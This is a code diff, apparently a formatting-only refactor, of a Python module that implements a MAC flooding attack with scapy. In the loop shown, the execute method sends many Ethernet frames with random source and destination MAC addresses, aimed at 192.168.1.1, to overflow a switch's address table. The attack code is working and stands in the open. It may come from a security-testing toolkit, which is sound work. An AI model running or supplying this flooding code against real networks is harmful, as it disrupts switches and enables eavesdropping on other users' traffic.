@@ -10,28 +10,33 @@ License: Proprietary
 Version: 1.0.0
 """
 
-import os, sys, time, argparse
-from typing import Dict, Any
+import argparse
+import os
+import sys
+import time
+from typing import Any
 
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
 try:
     from logger import get_logger
 except ImportError:
     import logging
+
     def get_logger(name):
         logger = logging.getLogger(name)
         if not logger.handlers:
             handler = logging.StreamHandler()
-            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
+            formatter = logging.Formatter("%(asctime)s - %(name)s - %(levelname)s - %(message)s")
             handler.setFormatter(formatter)
             logger.addHandler(handler)
             logger.setLevel(logging.INFO)
         return logger
 
+
 logger = get_logger(__name__)
 
 try:
-    from scapy.all import Ether, IP, TCP, RandMAC, sendp, conf
+    from scapy.all import IP, TCP, Ether, RandMAC, conf, sendp
 except ImportError:
     logger.error("Requires scapy: pip install scapy")
     sys.exit(1)
@@ -52,14 +57,16 @@ class MACFloodingAttack:
         conf.verb = 1 if verbose else 0
         logger.info(f"Initialized MAC flooding attack on {interface}")
 
-    def execute(self) -> Dict[str, Any]:
+    def execute(self) -> dict[str, Any]:
         """Execute the MAC flooding attack."""
         logger.info(f"Starting MAC flooding attack: {self.count} frames at {self.rate}/sec")
         start_time = time.time()
 
         try:
             for i in range(1, self.count + 1):
-                frame = Ether(src=str(RandMAC()), dst=str(RandMAC()))/IP(dst="192.168.1.1")/TCP()
+                frame = (
+                    Ether(src=str(RandMAC()), dst=str(RandMAC())) / IP(dst="192.168.1.1") / TCP()
+                )
                 sendp(frame, iface=self.interface, verbose=0)
                 self.frames_sent += 1
 
